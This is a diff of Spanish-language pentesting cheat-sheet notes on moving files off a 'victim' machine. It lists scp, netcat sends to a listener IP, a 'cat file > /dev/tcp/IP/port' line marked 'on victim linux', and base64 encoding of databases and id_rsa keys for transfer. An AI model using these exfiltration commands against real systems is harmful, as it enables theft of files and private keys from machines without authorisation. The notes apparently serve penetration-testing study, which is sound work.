@@ -16,32 +16,22 @@ El id_rsa debe tener el siguiente permiso
 ```bash
  ssh -i id_rsa usuario@host_remoto
 ```
-### SCP y transferencia de archivos
-#### Maneras posibles de pasar archivos
+## Transferencia de archivos
+* `SCP`
+* `find / -name 'sbd*'`
 Traer el archivo a mi maquina con scp
 ```bash
  scp target_user@IP_remota:/ruta/completa/al/archivo .
 ```
-Traer archivos con nc (cuando no dispongo contraseña)
-</br>en la mquina victima
+* `NC` 
+Es util cuando no dispongo de la contraseña
+</br>en la maquina victima
 ```bash
 nc 19.10.10.10 9091 < archivo
 ```
 luego en mi maquina
 ```bash
 nc -lvnp 9091 > archivo
-```
-Cuando no es posible, ej: una BD, entonces
-```bash
-base64 filename > outputfile.b64
-```
-Sino tambien
-```bash
-echo -n 'texto' | base64
-```
-Luego en mi maquina
-```bash
-base64 -d encodedfile.b64 > outputfile
 ```
 Otra Alternativa es
 ```bash
@@ -50,3 +40,19 @@ cat file.txt > /dev/tcp/192.168.1.23/4444 # on victim linux
 ```bash
 nc -lvp 4444 > file.txt # on Kali
 ```
+* `BASE64` 
+Cuando el archivo no es texto plano, ej: una BD, un id_rsa entonces
+Tenemos (2) formas
+1.
+```bash
+base64 filename.db > outputfile.db.b64
+```
+2. 
+```bash
+echo -n 'texto' | base64
+```
+Luego en mi maquina
+```bash
+base64 -d encodedfile.db.b64 > outputfile.db
+```
+
